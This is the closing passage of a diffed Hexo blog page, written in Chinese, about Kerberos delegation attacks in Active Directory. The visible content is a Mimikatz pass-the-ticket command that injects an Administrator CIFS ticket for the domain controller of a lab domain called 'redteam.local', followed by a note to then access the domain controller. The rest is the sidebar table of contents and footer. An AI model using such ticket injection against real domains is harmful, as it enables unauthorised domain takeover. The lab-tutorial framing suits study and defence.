+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@redteam.local@REDTEAM.LOCAL_cifs~DC.redteam.local@REDTEAM.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后访问域控</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIHEt.png" alt="wXIHEt.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/" rel="next" title="kerberos协议及问题">
+                <i class="fa fa-chevron-left"></i> kerberos协议及问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars.githubusercontent.com/u/47177122?v=4"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01%E5%A7%94%E6%B4%BE"><span class="nav-number">1.</span> <span class="nav-text">0x01委派</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">1.1.</span> <span class="nav-text">0x02 非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%AD%9B%E9%80%89%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%9A%84%E8%B4%A6%E5%8F%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text">2.1 筛选非约束性委派的账号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-powerview-ps1"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">2.1.1 powerview.ps1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-ADFind"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">2.1.2 ADFind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-3-ldapsearch"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">2.1.3 ldapsearch</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.2 非约束性委派攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E9%85%8D%E5%90%88%E6%89%93%E5%8D%B0%E6%9C%BA"><span class="nav-number">1.1.3.</span> <span class="nav-text">2.3 非约束性委派配合打印机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">1.2.</span> <span class="nav-text">0x03 约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%AD%9B%E9%80%89%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%B4%A6%E5%8F%B7"><span class="nav-number">1.2.1.</span> <span class="nav-text">3.1 筛选约束性委派账号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-ldapsearch"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">3.1.1 ldapsearch</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-FuckLdap"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">3.1.2 FuckLdap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.2.</span> <span class="nav-text">3.2 约束性委派攻击</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
